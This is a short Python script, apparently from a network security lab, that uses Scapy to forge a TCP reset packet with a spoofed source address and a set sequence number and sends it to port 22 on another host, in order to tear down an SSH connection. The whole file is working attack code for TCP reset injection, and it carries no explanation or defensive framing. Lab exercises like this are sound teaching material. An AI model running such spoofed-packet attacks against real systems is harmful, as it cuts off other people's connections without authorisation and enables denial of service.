import sys
from scapy.all import *

print("sending reset packet...")
IPLayer = IP (src="10.10.10.199", dst = "10.10.10.197")
TCPLayer = TCP (sport=49220, dport=22, flags="R", seq=145878833)
pkt=IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)


